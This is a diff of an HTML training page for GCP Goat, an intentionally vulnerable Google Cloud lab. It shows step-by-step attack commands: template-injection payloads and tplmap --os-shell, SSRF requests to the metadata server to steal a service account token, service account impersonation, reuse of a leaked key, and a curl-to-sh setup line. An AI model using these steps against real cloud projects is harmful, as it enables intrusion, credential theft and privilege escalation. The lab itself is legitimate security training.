 <pre><code class="language-bash">kubectl get nodes -o wide
 </code></pre>
-<p>Now go to the browser and enter the below URL</p>
-<pre><code>&lt;NODE-IP&gt;:30003
+<blockquote>
+<p>Note the ip address of the node</p>
+</blockquote>
+<p>Verify the application is running by typing the below command </p>
+<pre><code class="language-bash">kubectl get pods -n test
 </code></pre>
-<p><img src="images/scenario-3a.png" alt="scenario-3a" /></p>
-<p>This reveals that the MongoDB service running on the node </p>
-<p>Now similar to <code>MySQL</code> we will try to connect to the <code>MongoDB</code> database remotely</p>
-<p>To connect from the mongo remotely we have to install MongoDB If you don't have <code>MongoDB</code> Installed you can easily Install by following <a href="https://docs.mongodb.com/manual/installation/">Official Docs</a> </p>
-<p>Now try to connect to the remote instance by typing the below command in the terminal</p>
-<pre><code class="language-bash">mongo --host &lt;ip&gt;:30003
+<p>Next try to access the application by accessing the below url in the browser</p>
+<pre><code class="language-bash">http://&lt;node-ip&gt;:30003/page
 </code></pre>
-<p><img src="images/scenario-3b.png" alt="scenario-3b" /></p>
-<p>You could see we get the shell access to <code>mongo-db</code> instance</p>
+<p>The application that we deployed is vulnerable to <code>Server Side Template Injection</code> we are going to exploit it to get the shell in the container</p>
+<p>We can verify that by typing the below payload in the <code>name</code> parameter by entering the below payload in the search box and click on the Generate page </p>
+<pre><code class="language-bash">{{7*7}}
+</code></pre>
+<p>You can see the output as <code>49</code> which means the application is vulnerable to <code>Server Side Template Injection</code></p>
+<p>Next we are going to use the <code>tplmap</code> tool to exploit the <code>Server Side Template Injection</code> vulnerability </p>
+<p>In order to do that , first clone the tplmap repository by typing the below command in the <code>GCLOUD SHELL</code></p>
+<pre><code class="language-bash">git clone https://github.com/epinna/tplmap.git
+</code></pre>
+<p>Next move into the directory by typing the below command in the terminal</p>
+<pre><code class="language-bash">cd tplmap 
+</code></pre>
+<p>Next execute the below command to exploit the <code>Server Side Template Injection</code> vulnerability </p>
+<pre><code class="language-bash">python3 tplmap.py -u http://&lt;node-ip&gt;:30003/page?name=gcp-goat --os-shell
+</code></pre>
+<p>You will get the shell in the container</p>
+<p>Now we can use the <code>service account</code> associated with the pod to perform the privilege escalation</p>
+<p>For example lets' try to list down the buckets in the project by typing the below command in the terminal</p>
+<pre><code class="language-bash">gsutil ls
+</code></pre>
+<p>You can find the list of buckets in the project</p>
+<p>Since the service account has the <code>Editor</code> role we can perform as many actions as we want</p>
 <p>If you are interested more on the <code>Kubernetes</code> I highly recommend to check out <a href="https://madhuakula.com/kubernetes-goat">Kubernetes-Goat</a></p>
-<h3 id="clean-up-2"><a class="header" href="#clean-up-2">Clean up</a></h3>
+<h3 id="clean-up-3"><a class="header" href="#clean-up-3">Clean up</a></h3>
+<p>Exit from the os-shell by pressing <code>Ctrl + C</code></p>
 <p>To clean up the <code>Scenario</code> type the below command in the <code>GCLOUD SHELL</code></p>
-<pre><code class="language-bash">./delete-scenario-3.sh 
+<pre><code class="language-bash">gcloud container clusters delete   gcp-goat-cluster --zone &quot;asia-east1-a&quot; -q 
+</code></pre>
+<blockquote>
+<p>Make sure to delete the kubernetes cluster before deleting the terraform resources</p>
+</blockquote>
+<pre><code class="language-bash">cd scenario-4
+</code></pre>
+<pre><code class="language-bash">terraform destroy -auto-approve -var project-id=$PROJECT_ID -var project_number=$PROJECT_NUMBER
 </code></pre>
 <p>Move into the previous folder by typing the below command in the <code>GCLOUD SHELL</code></p>
 <pre><code class="language-bash">cd ..
 </code></pre>
-<h2 id="attacking-google-cloud-storage"><a class="header" href="#attacking-google-cloud-storage">Attacking Google Cloud Storage</a></h2>
-<p>In order to start the scenario go to the <code>scenario-4</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
-<pre><code class="language-bash">cd scenario-4
-</code></pre>
-<p>Start the Scenario by typing the below command in the <code>GCLOUD Shell</code> the script expects the user to give the Service name </p>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="attacking-google-app-engine"><a class="header" href="#attacking-google-app-engine">Attacking Google App Engine</a></h2>
 <blockquote>
-<p>Note if you try to deploy the same scenario use different service account name, because reusing same the name will create conflicts and Also make sure to use the SERVICE ACCOUNT NAME with the length between 6 and 30</p>
+<p>Note please execute this scenario as the last scenario because it requires you to delete the project in order to clean up the resources</p>
 </blockquote>
-<pre><code class="language-bash">./create-scenario-4.sh &lt;SERVICE-ACCOUNT_NAME&gt;
+<p>In order to start the scenario go to the <code>scenario-5</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
+<p>First export the project id using the below command </p>
+<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
 </code></pre>
-<h3 id="scenario-info-3"><a class="header" href="#scenario-info-3">Scenario info</a></h3>
-<p>Public-Facing Google Bucket is the most common vulnerability in the <code>GCP</code> environment Users often create the bucket with public access in order to use the data stored in the bucket to be used by external application ,Sometimes this leads leakage of sensitive information</p>
+<p>Next configure the <code>gcloud</code> to use the project by typing the below command</p>
+<pre><code class="language-bash">gcloud config set project $PROJECT_ID
+</code></pre>
+<p>Next enable the <code>App Engine</code> API by typing the below command</p>
+<pre><code class="language-bash">gcloud services enable appengine.googleapis.com
+</code></pre>
+<p>Next deploy the <code>App Engine</code> by typing the below command</p>
+<pre><code class="language-bash">gcloud app deploy
+</code></pre>
+<blockquote>
+<p>Select the region you want to deploy and press <code>Y</code> to continue</p>
+</blockquote>
+<p>Once it is done you can find the application url by typing the below command</p>
+<pre><code class="language-bash">gcloud app browse
+</code></pre>
+<h2 id="scenario-info-4"><a class="header" href="#scenario-info-4">Scenario Info</a></h2>
+<p>According to the <a href="https://en.wikipedia.org/wiki/Google_App_Engine">Wikipedia</a></p>
+<p><strong>Google App Engine (often referred to as GAE or simply App Engine) is a Platform as a Service and cloud computing platform for developing and hosting web applications in Google-managed data centers. Applications are sandboxed and run across multiple servers. App Engine offers automatic scaling for web applications—as the number of requests increases for an application, App Engine automatically allocates more resources for the web application to handle the additional demand.</strong></p>
+<p>By default the <code>App Engine</code> is deployed with the <code>default</code> app engine service account which has the <code>Editor</code> role in the project</p>
+<p>In this scenario we are going to exploit the <code>SSRF</code> vulnerability in the deployed application and use the <code>Metadata Server</code> to get the service account token</p>
 <h3 id="solution-3"><a class="header" href="#solution-3">Solution</a></h3>
-<p>Go to the URL shown in the output the above script</p>
-<p><img src="images/scenario-4a.png" alt="scenario-4a" /></p>
-<p>Now open the URL in the browser On opening the URL it shows there was a file called <code>service-key.json</code></p>
-<p><img src="images/scenario-4b.png" alt="scenario-4b" /></p>
-<p>Download the file by typing the below command in the <code>GCLOUD Shell</code></p>
-<pre><code class="language-bash">wget &lt;URL&gt;/service-key.json
+<p>First Let's try to access the <code>Metadata endpoint</code> that gives you the information about the project id by typing the below payload in the <code>URL</code> field</p>
+<pre><code class="language-bash">http://metadata.google.internal/computeMetadata/v1/project/project-id
 </code></pre>
-<p>Executing <code>cat</code> command on the <code>service-key.json</code> reveals that it was service account key </p>
-<p><img src="images/scenario-4c.png" alt="scenario-4c" /></p>
-<p>In the next Scenario we will see how to use the  obtained key</p>
-<h3 id="clean-up-3"><a class="header" href="#clean-up-3">Clean up</a></h3>
-<p>To clean up the <code>Scenario</code> type the below command in the <code>GCLOUD Shell</code></p>
-<pre><code class="language-bash">./delete-scenario-4.sh 
+<p>Under the <code>Headers</code> section add the below header</p>
+<pre><code class="language-bash">Metadata-Flavor: Google
 </code></pre>
-<p>Move into the previous folder by typing the below command in the <code>GCLOUD Shell</code></p>
-<pre><code class="language-bash">cd ..
+<p>And click on <code>CHECK STATUS</code> button and you can find the project id in the response</p>
+<p>Next try to access the <code>Metadata endpoint</code> that gives you the information about the service account token by typing the below payload in the <code>URL</code> field</p>
+<pre><code class="language-bash">http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 </code></pre>
-<h2 id="privilege-escalation-using-service-account"><a class="header" href="#privilege-escalation-using-service-account">Privilege escalation Using Service account</a></h2>
+<p>You can find the <code>access_token</code> in the response and you can use this token to perform the privilege escalation in the project</p>
 <blockquote>
-<p>Note This scenario was based on the previous scenario So before continuing this scenario please make sure that you have completed the previous one </p>
+<p>Note In recent version Compute Engine SSRF is only possible if you able to pass the <code>headers</code> as <code>Metadata-Flavor: Google</code> </p>
 </blockquote>
-<p>Inorder to start the scenario go to the <code>scenario-5</code> folder by typing the below command in the  <code>GCloud Shell</code></p>
-<pre><code class="language-bash">cd scenario-5
-</code></pre>
-<p>Start the Scenario by typing the below command in the  <code>GCloud Shell</code></p>
-<pre><code class="language-bash">./create-scenario-5.sh
-</code></pre>
-<h3 id="scenario-info-4"><a class="header" href="#scenario-info-4">Scenario Info</a></h3>
-<p>Google Container Registry Allows to store our container Registry Google Container Registry uses <code>Google Storage Bucket</code> to store the image So anyone with admin access to the bucket can download the image</p>
-<h3 id="scenario-solution"><a class="header" href="#scenario-solution">Scenario Solution</a></h3>
-<p>In order to get access to the bucket, we are going to use <code>Service-Account-Key</code> that we obtain in the previous scenario</p>
-<p>Before proceeding with the scenario copy the key from the scenario-4 directory to the current directory by typing the below command</p>
-<pre><code class="language-bash">cd ..
-cp scenario-4/service-key.json scenario-5/service-key.json
-cd scenario-5
-</code></pre>
-<p>Now activate the service account using the key by typing the below command in the  <code>GCloud Shell</code></p>
-<pre><code class="language-bash">gcloud auth activate-service-account --key-file=service-key.json
-
-</code></pre>
-<p>Now list the container stored in Google Container Registry by typing the below  command in the  <code>GCloud Shell</code></p>
-<pre><code class="language-bash">gcloud container images list
-</code></pre>
-<p><img src="images/scenario-5a.png" alt="scenario-5a" /></p>
-<p>Now download and run the container by typing the below command in the  <code>GCloud Shell</code></p>
-<pre><code class="language-bash">docker run  --rm  -ti  gcr.io/&lt;project-name&gt;/secret:v1 sh
-</code></pre>
-<blockquote>
-<p>make sure to add the tag in the Container Name The name should be in the format of gcr.io/<project-name>/secret:v1</p>
-</blockquote>
-<p>On listing down the file container using <code>ls</code> command there was a file called <code>secret</code></p>
-<p><img src="images/scenario-5b.png" alt="scenario-5a" /></p>
-<p>Now perform <code>cat</code> on the file  to see the content on the File</p>
-<p><img src="images/scenario-5c.png" alt="scenario-5c" /></p>
-<p>Get out of the container shell by typing <code>exit</code> in the shell</p>
 <h3 id="clean-up-4"><a class="header" href="#clean-up-4">Clean up</a></h3>
-<p>Before cleaning the scenario switch back to the original account by typing below command in the  <code>GCloud Shell</code></p>
-<pre><code class="language-bash"> gcloud config set account &lt;email&gt;
-
-</code></pre>
-<p>To clean up the <code>Scenario</code> type the below command in the  <code>GCloud Shell</code></p>
-<blockquote>
-<p>Note this name should be the same name that we used to create the scenario-4</p>
-</blockquote>
-<pre><code class="language-bash">./delete-scenario-5.sh &lt;SERVICE-ACCOUNT_NAME&gt;
-</code></pre>
-<h1 id="privilege-escalation-in-compute-engine"><a class="header" href="#privilege-escalation-in-compute-engine">Privilege Escalation in Compute Engine</a></h1>
-<p>Inorder to start the scenario go to the <code>scenario-6</code> folder by typing the below command in the <code>GCLOUD SHELL</code></p>
+<p>According to the google , there is no way to delete the <code>App Engine</code> service account so you have to delete the project in order to clean up the resources</p>
+<p>So we recommend you to delete the project after completing the scenario</p>
+<h2 id="references"><a class="header" href="#references">References</a></h2>
+<ol>
+<li>
+<p>In order to learn more about <code>SSRF</code> in Google Cloud I highly recommend to check out <a href="https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/">Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments</a>  by <a href="https://about.gitlab.com/company/team/#init_string">Chris Moberly</a></p>
+</li>
+<li>
+<p>More details about the meta-data endpoint <a href="https://hackingthe.cloud/gcp/general-knowledge/metadata_in_google_cloud_instances/">link</a></p>
+</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="privilege-escalation-using-service-account-impersonation"><a class="header" href="#privilege-escalation-using-service-account-impersonation">Privilege Escalation Using Service account impersonation</a></h2>
+<p>In order to start the scenario go to the <code>scenario-6</code> folder by typing the below  command in the shell</p>
 <pre><code class="language-bash">cd scenario-6
 </code></pre>
-<p>Start the Scenario by typing the below command in the <code>GCLOUD Shell</code></p>
-<pre><code class="language-bash">./create-scenario-6.sh
+<p>Export the project ID by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
 </code></pre>
 <blockquote>
-<p>Note: It takes some time , so be patient 🧘‍♂️ Note down the ip</p>
+<p>replace the <code>project-id</code> with your project ID</p>
 </blockquote>
-<p>Now Go to the <code>Compute Engine</code> -&gt; <code>VMInstance</code></p>
-<p><img src="./images/2021-07-25-14-49-09.png" alt="" /></p>
-<p>Now click on the <code>ssh</code> , the New browser window will be open <code>ssh-terminal</code></p>
-<p><img src="./images/2021-08-07-14-42-31.png" alt="" /></p>
-<p>Type the below command in the terminal </p>
-<pre><code class="language-bash">curl https://raw.githubusercontent.com/JOSHUAJEBARAJ/hack/main/setup.sh | sh 
+<p>Next configure the <code>gcloud</code> to use the project by typing the below command in the shell </p>
+<pre><code class="language-bash">gcloud config set project $PROJECT_ID
 </code></pre>
-<blockquote>
-<p>Python Server will be started </p>
-</blockquote>
+<p>Next initialize the terraform by typing the below command in the shell </p>
+<pre><code class="language-bash">terraform init
+</code></pre>
+<p>Next apply the terraform by typing the below command in the shell </p>
+<pre><code class="language-bash">terraform apply -auto-approve -var project-id=$PROJECT_ID
+</code></pre>
+<p>Next output the service account key by typing the below command in the shell </p>
+<pre><code class="language-bash">terraform output -raw sa-key &gt; creds.json
+</code></pre>
 <h2 id="scenario-info-5"><a class="header" href="#scenario-info-5">Scenario Info</a></h2>
 <p>According to Google <a href="https://cloud.google.com/iam/docs/service-accounts">Documentation</a> </p>
-<p><strong>A service account is a special kind of account used by an application or a virtual machine (VM) instance, not a person. Applications use service accounts to make authorized API calls, authorized as either the service account itself, or as Google Workspace or Cloud Identity users through domain-wide delegation.</strong></p>
-<p>The default service account created with the VM Instance doesn't follow the least privilege principle be default its able to access the Google cloud bucket</p>
-<p>Now Go to the below url</p>
-<pre><code>http://&lt;ip-address&gt;/page?name=Joshua
-</code></pre>
-<p><img src="./images/2021-07-25-19-49-25.png" alt="" /></p>
-<p>Now try to use the different paramater </p>
-<pre><code class="language-bash"></code></pre>
-<p><img src="./images/2021-08-07-14-47-10.png" alt="" />
-Check whether the application is vulnerable to the template Injection</p>
-<pre><code>http://&lt;ip&gt;/page?name={{7*7}}
-</code></pre>
-<p>You could see the application is vulnerable to <a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection">template-Injection</a>.</p>
-<p><img src="./images/2021-08-07-14-48-23.png" alt="tql" /></p>
+<p><strong>A service account is a special kind of account used by an application or a virtual machine (VM) instance, not a person.</strong></p>
+<p>One of the coolest feature of the service account is that it can be impersonated by any user/service account in the project if the user/service account has the <code>iam.serviceAccountTokenCreator</code> role in the project. In this scenario we are going to exploit this feature </p>
+<p>Whenever we want to impersonate the service account we need to add the <code>iam.ServiceAccountTokenCreator</code> role to the user/service account , but keep in the mind if we add this role at the project level then the user/service account can impersonate any service account in the project. </p>
+<p>In this scenario we are going to impersonate the <code>default-compute-engine</code> service account which has the <code>Editor</code> role in the project</p>
 <h3 id="solution-4"><a class="header" href="#solution-4">Solution</a></h3>
-<p>To exploit this vulnerability we are going to use the tool called <a href="https://github.com/epinna/tplmap">tplmap</a></p>
-<pre><code>./tplmap.py -u 'http://&lt;ip&gt;/page?name=John'
+<p>This scenario assumes that the attacker has already compromise the <code>service-account</code> which as the <code>iam.serviceAccountTokenCreator</code></p>
+<p>Configure the <code>gcloud</code> to use the <code>service-account</code> by typing the below command in the shell </p>
+<pre><code class="language-bash">gcloud auth activate-service-account --key-file=creds.json
 </code></pre>
-<p>you will get the output like this </p>
-<p><img src="./images/2021-07-25-19-59-09.png" alt="" /></p>
-<p>Now try to get the shell in the application </p>
-<pre><code>./tplmap.py -u 'http://&lt;ip&gt;/page?name=jebaraj' --os-shell
+<p>Now try to list the buckets in the project by typing the below command in the shell </p>
+<pre><code class="language-bash">gsutil ls
 </code></pre>
-<p>Now inside the shell try to list the bucket </p>
-<pre><code>gsutil ls 
+<blockquote>
+<p>You will get an error saying that you don't have permission to list the buckets</p>
+</blockquote>
+<p>Next we are trying to impersonate the default-compute-engine service account which has <code>Editor</code> permission in the project</p>
+<p>Export the <code>default-compute-engine</code> service account email by typing the below command in the shell </p>
+<pre><code class="language-bash">export SA_EMAIL=$(gcloud projects describe $PROJECT_ID --format=&quot;value(projectNumber)&quot;)-compute@developer.gserviceaccount.com
 </code></pre>
-<p><img src="./images/2021-08-07-14-53-53.png" alt="" />
-You will see the all buckets present in the project </p>
+<pre><code class="language-bash">gcloud config set auth/impersonate_service_account $SA_EMAIL
+</code></pre>
+<p>Now try to list the buckets in the project by typing the below command in the shell </p>
+<pre><code class="language-bash">gsutil ls
+</code></pre>
+<p>This time you will be able to list the buckets in the project</p>
+<p>Now as the attacker you can do anything in the project as the <code>default-compute-engine</code> service account</p>
+<p>Next we are going to unset the impersonated service account by typing the below command in the shell </p>
+<pre><code class="language-bash">gcloud config unset auth/impersonate_service_account
+</code></pre>
 <h3 id="clean-up-5"><a class="header" href="#clean-up-5">Clean up</a></h3>
 <p>To clean up the <code>Scenario</code> type the below command in the <code>GCLOUD Shell</code></p>
-<pre><code class="language-bash">./delete-scenario-6.sh
+<pre><code class="language-bash">terraform destroy -auto-approve -var project-id=$PROJECT_ID
 </code></pre>
-<h1 id="wrapping-up"><a class="header" href="#wrapping-up">Wrapping up</a></h1>
-<p>Once you have done the all scenarios To avoid any extra charges and to make sure all resources are deleted , Delete the project </p>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="wrapping-up"><a class="header" href="#wrapping-up">Wrapping up</a></h2>
+<p>It's recommended to delete the project after you are done with the GCP Goat. You can do this by running the following command: </p>
+<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
+</code></pre>
 <pre><code class="language-bash">gcloud projects delete PROJECT_ID
 </code></pre>
-<h2 id="contributing-to-the-gcp-goat"><a class="header" href="#contributing-to-the-gcp-goat">Contributing to the GCP GOAT</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="contributing-to-the-gcp-goat"><a class="header" href="#contributing-to-the-gcp-goat">Contributing to the GCP GOAT</a></h2>
 <p>Thanks for Showing Interest to Contribute to the <code>GCP-GOAT</code></p>
 <p>Here are the few ways you can contribute</p>
 <ul>
@@ -469,9 +634,7 @@ You will see the all buckets present in the project </p>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
-                        
 
-                        
 
                         <div style="clear: both"></div>
                     </nav>
@@ -479,17 +642,16 @@ You will see the all buckets present in the project </p>
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
-                
 
-                
             </nav>
 
         </div>
 
-        
         <!-- Livereload script (if served using the cli tool) -->
-        <script type="text/javascript">
-            var socket = new WebSocket("ws://localhost:3000/__livereload");
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
             socket.onmessage = function (event) {
                 if (event.data === "reload") {
                     socket.close();
@@ -501,42 +663,30 @@ You will see the all buckets present in the project </p>
                 socket.close();
             }
         </script>
-        
 
-        
 
-        
 
-        
-        <script type="text/javascript">
+        <script>
             window.playground_copyable = true;
         </script>
-        
 
-        
 
-        
-        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
-        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
-        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
-        
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
 
-        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
-        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
-        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
 
         <!-- Custom JS scripts -->
-        
 
-        
-        
-        <script type="text/javascript">
+        <script>
         window.addEventListener('load', function() {
             window.setTimeout(window.print, 100);
         });
         </script>
-        
-        
 
+    </div>
     </body>
 </html>
